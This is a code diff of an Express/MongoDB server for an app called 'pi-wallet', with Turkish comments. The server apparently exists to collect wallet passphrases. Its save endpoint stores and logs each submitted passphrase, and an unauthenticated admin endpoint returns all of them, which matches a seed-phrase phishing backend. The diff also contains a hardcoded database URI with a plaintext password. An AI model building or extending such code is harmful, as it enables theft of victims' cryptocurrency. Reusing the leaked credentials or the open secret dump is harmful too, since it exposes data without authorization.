@@ -1,6 +1,5 @@
 const express = require('express');
 const path = require('path');
-const { MongoClient, ServerApiVersion } = require('mongodb');
 const mongoose = require('mongoose');
 const dotenv = require('dotenv');
 const Passphrase = require('./models/Passphrase');
@@ -10,23 +9,34 @@ dotenv.config();
 const app = express();
 
 // MongoDB bağlantı ayarları
-const uri = "mongodb+srv://develophasan:Vkm79dHv9pQfUzgq@cluster0.dbj9u.mongodb.net/pi-wallet?retryWrites=true&w=majority&appName=Cluster0";
+const connectDB = async () => {
+  try {
+    await mongoose.connect("mongodb+srv://develophasan:Vkm79dHv9pQfUzgq@cluster0.dbj9u.mongodb.net/pi-wallet?retryWrites=true&w=majority&appName=Cluster0", {
+      dbName: 'pi-wallet',
+      connectTimeoutMS: 60000,
+      socketTimeoutMS: 60000,
+      serverSelectionTimeoutMS: 60000,
+      maxPoolSize: 10,
+      minPoolSize: 5,
+      retryWrites: true,
+      retryReads: true,
+      w: 'majority'
+    });
+    console.log('MongoDB bağlantısı başarılı!');
+  } catch (err) {
+    console.error('MongoDB bağlantı hatası:', err);
+    // 5 saniye sonra tekrar bağlanmayı dene
+    setTimeout(connectDB, 5000);
+  }
+};
 
-mongoose.connect(uri, {
-  serverApi: {
-    version: ServerApiVersion.v1,
-    strict: true,
-    deprecationErrors: true
-  },
-  dbName: 'pi-wallet',
-  connectTimeoutMS: 30000,
-  socketTimeoutMS: 60000
-})
-.then(() => {
-  console.log("MongoDB bağlantısı başarılı!");
-})
-.catch(err => {
-  console.error('MongoDB bağlantı hatası:', err);
+// İlk bağlantıyı başlat
+connectDB();
+
+// Bağlantı koptuğunda yeniden bağlan
+mongoose.connection.on('disconnected', () => {
+  console.log('MongoDB bağlantısı kesildi. Yeniden bağlanılıyor...');
+  setTimeout(connectDB, 5000);
 });
 
 // CORS ayarları
@@ -45,18 +55,19 @@ app.use((req, res, next) => {
 app.use(express.json());
 app.use(express.static(path.join(__dirname, 'build')));
 
-// Hata yakalama middleware
-app.use((err, req, res, next) => {
-  console.error('Global error:', err);
-  res.status(500).json({ 
-    success: false, 
-    error: 'Internal server error',
-    details: process.env.NODE_ENV === 'development' ? err.message : undefined
-  });
-});
+// Middleware to check MongoDB connection
+const checkDBConnection = (req, res, next) => {
+  if (mongoose.connection.readyState !== 1) {
+    return res.status(503).json({
+      success: false,
+      error: 'Veritabanı bağlantısı kurulamadı. Lütfen biraz sonra tekrar deneyin.'
+    });
+  }
+  next();
+};
 
 // Passphrase kaydetme endpoint'i
-app.post('/api/save-passphrase', async (req, res, next) => {
+app.post('/api/save-passphrase', checkDBConnection, async (req, res) => {
   try {
     console.log('İstek alındı:', req.body);
     
@@ -72,27 +83,27 @@ app.post('/api/save-passphrase', async (req, res, next) => {
       uniqueId: `${Date.now()}-${Math.random().toString(36).substr(2, 9)}`
     });
 
-    await newPassphrase.save();
-    console.log('Passphrase kaydedildi:', newPassphrase._id);
+    const savedPassphrase = await newPassphrase.save();
+    console.log('Passphrase kaydedildi:', savedPassphrase._id);
     
     res.json({ success: true });
   } catch (error) {
     console.error('Kaydetme hatası:', error);
-    next(error);
+    res.status(500).json({ success: false, error: error.message });
   }
 });
 
 // Admin endpoint'i
-app.get('/api/admin/passphrases', async (req, res) => {
+app.get('/api/admin/passphrases', checkDBConnection, async (req, res) => {
   try {
     const passphrases = await Passphrase.find().sort({ createdAt: -1 });
-    res.json(passphrases);
+    res.json({ success: true, data: passphrases });
   } catch (error) {
-    res.status(500).json({ error: 'Veriler alınamadı' });
+    console.error('Veri alma hatası:', error);
+    res.status(500).json({ success: false, error: 'Veriler alınamadı' });
   }
 });
 
-// React router için catch-all route
 app.get('*', (req, res) => {
   res.sendFile(path.join(__dirname, 'build', 'index.html'));
 });
@@ -100,4 +111,9 @@ app.get('*', (req, res) => {
 const port = process.env.PORT || 3001;
 app.listen(port, () => {
   console.log(`Sunucu ${port} portunda çalışıyor`);
+});
+
+// Genel hata yakalama
+process.on('unhandledRejection', (error) => {
+  console.error('Yakalanmamış Promise Reddi:', error);
 }); 
